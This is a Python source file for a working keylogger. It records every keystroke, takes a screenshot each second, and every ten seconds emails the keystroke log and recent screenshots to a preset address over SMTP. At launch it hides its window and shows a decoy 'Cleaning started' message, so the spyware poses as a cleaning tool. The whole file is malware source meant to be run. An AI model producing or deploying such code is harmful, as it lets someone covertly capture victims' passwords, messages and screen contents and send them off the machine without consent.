import keyboard # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer, Thread
from datetime import datetime
import pyautogui

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import smtplib

import tkinter as tk
from tkinter import messagebox
import os

SENDER_EMAIL = 'example@example.com'
RECEIVER_EMAIL = 'example@example.com'
SMTP_SERVER = 'smtp.example.com (smtp.office365.com)'
SMTP_PORT = 587
USERNAME = 'example@example.com'
PASSWORD = '*********'


DEF_PATH = os.path.dirname(os.path.realpath(__file__))
PATH = f"{DEF_PATH}/logs"
if not os.path.exists(PATH):
    os.mkdir(PATH)

SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
TAKE_SCREENSHOT_EVERY = 1
LOG_FILE = f"{PATH}/log.txt"


class Keylogger:

    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        self.end_dt = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        self.filename = ""
        self.counter = 0
        self.running = False
        self.keyboard_hook = None
        self.screenshot_timer = None



    
    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " [space] "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        now =  datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        later =  datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        self.filename = f"keylog-{now} -- {later}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{PATH}/log.txt", "a", encoding="utf-8") as f:
            # write the keylogs to the file
            f.write(self.start_dt + ": " + self.log + '\n')
        print(f"[+] Updated log.txt")

    def send_email(self):
        # Get the list of files in the folder sorted by modification time
        files = sorted(os.listdir(PATH), key=lambda x: os.path.getmtime(os.path.join(PATH, x)), reverse=True)

        # Select the last 10 photos and the text file
        photos = [file for file in files if file.lower().endswith(('.jpg', '.jpeg', '.png'))][:10]
        text_file = [file for file in files if file.lower().endswith('.txt')]

        # Create the email message
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = RECEIVER_EMAIL
        message['Subject'] = 'Last 10 Photos and Text File'

        # Attach the text file
        with open(os.path.join(PATH, text_file[0]), 'r') as f:
            text = f.read()
        text_attachment = MIMEText(text)
        text_attachment.add_header('Content-Disposition', 'attachment', filename=text_file[0])
        message.attach(text_attachment)

        # Attach the photos
        for photo in photos:
            with open(os.path.join(PATH, photo), 'rb') as f:
                img_data = f.read()
            image_attachment = MIMEImage(img_data)
            image_attachment.add_header('Content-Disposition', 'attachment', filename=photo)
            message.attach(image_attachment)

        # Send the email
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message.as_string())
            server.quit()

        print('Email sent successfully!')


    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        self.update_filename()
        screenshot.save(f"{PATH}/{self.filename}.png")


    def take_screenshots(self):
        self.take_screenshot()
        self.screenshot_timer = Timer(interval=TAKE_SCREENSHOT_EVERY, function=self.take_screenshots)
        self.screenshot_timer.daemon = True
        self.screenshot_timer.start()

        
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.end_dt = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
            self.update_filename()
            self.report_to_file()
            self.send_email()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        
        # record the start datetime
        self.start_dt = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        self.take_screenshots()

        # make a simple message
        now = datetime.now().strftime("%d-%m-%Y %H.%M.%S")
        print(f"{now} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()



if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Cleaning", "Cleaning started")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
